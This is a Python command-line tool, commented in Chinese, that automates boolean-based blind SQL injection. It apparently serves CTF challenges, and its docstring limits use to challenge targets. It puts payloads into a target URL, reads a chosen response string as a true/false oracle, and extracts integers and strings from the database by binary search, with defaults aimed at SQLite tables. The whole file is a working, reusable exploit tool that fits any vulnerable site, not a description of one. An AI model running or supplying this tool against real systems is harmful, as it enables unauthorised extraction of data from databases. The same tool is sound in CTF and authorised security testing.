#!/usr/bin/env python3
"""通用布尔盲注 dumper —— 给 ezSQL 这类题用。

用法示例:
  python sqlblind.py --url "http://1.2.3.4:8080/?id=1" \
      --true "Welcome" --false "查无此卷"

原理: 把 --url 里的标记点 %%INJ%% 替换成 payload 发请求, 用响应里是否出现 --true
      判断布尔真假, 然后按位二分 dump。没写 %%INJ%% 时默认替换 URL 里最后一个数字。

只对题目靶机使用。
"""
import argparse, sys, time, urllib.parse, urllib.request, urllib.error

UA = {"User-Agent": "Mozilla/5.0"}


def fetch(url, timeout=15):
    req = urllib.request.Request(url, headers=UA)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.read().decode("utf-8", "replace")
    except Exception as e:
        return "<ERR %s>" % e


def make_oracle(url, true_s, false_s, delay):
    def test(payload):
        if "%%INJ%%" in url:
            u = url.replace("%%INJ%%", urllib.parse.quote(payload, safe=""))
        else:
            # 默认: 替换最后一个连续数字
            import re
            u = re.sub(r"(\d+)(?!.*\d)", lambda m: urllib.parse.quote(payload, safe=""), url)
        body = fetch(u)
        if delay:
            time.sleep(delay)
        ok_t = (true_s in body) if true_s else True
        ok_f = (false_s in body) if false_s else False
        if true_s and false_s:
            return ok_t and not ok_f
        return ok_t and not ok_f
    return test


def dump_int(test, expr, maxlen=12):
    """二分出一个整数表达式的结果"""
    lo, hi = 0, 10 ** maxlen
    if not test(expr + ">0"):
        return 0
    while lo < hi:
        mid = (lo + hi + 1) // 2
        if test("%s>%d" % (expr, mid)):
            lo = mid
        else:
            hi = mid - 1
    return lo


def dump_str(test, sel, maxlen=80, charset=None):
    """逐字符 dump, sel 需自带括号, 例如 (select group_concat(name) from sqlite_master)"""
    if charset is None:
        charset = [chr(c) for c in range(32, 127)]
    out = []
    for pos in range(1, maxlen + 1):
        if not test("length(%s)>=%d" % (sel, pos)):
            break
        lo, hi = 0, len(charset) - 1
        # 先确认是否落在字符集内
        found = -1
        lo, hi = 0, len(charset) - 1
        while lo <= hi:
            mid = (lo + hi) // 2
            if test("unicode(substr(%s,%d,1))>=%d" % (sel, pos, ord(charset[mid]))):
                found = mid
                lo = mid + 1
            else:
                hi = mid - 1
        if found < 0:
            out.append("?")
        else:
            out.append(charset[found])
        sys.stdout.write("\r[%s]" % ("".join(out)))
        sys.stdout.flush()
    print()
    return "".join(out)


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", required=True, help="含 %%INJ%% 占位符的 URL")
    ap.add_argument("--true", default="", help="TRUE 时响应里出现的字符串")
    ap.add_argument("--false", default="", help="FALSE 时响应里出现的字符串")
    ap.add_argument("--delay", type=float, default=0.0)
    ap.add_argument("--expr", default="", help="直接 dump 一个整数表达式, 如 (select count(*) from x)")
    ap.add_argument("--sel", default="", help="dump 一个字符串表达式")
    ap.add_argument("--maxlen", type=int, default=60)
    a = ap.parse_args()
    t = make_oracle(a.url, a.true, a.false, a.delay)
    print("[*] 基线自检: TRUE=%s FALSE=%s" % (t("1=1"), t("1=2")))
    if a.expr:
        print("[+] %s = %d" % (a.expr, dump_int(t, a.expr)))
    if a.sel:
        print("[+] %s = %s" % (a.sel, dump_str(t, a.sel, a.maxlen)))
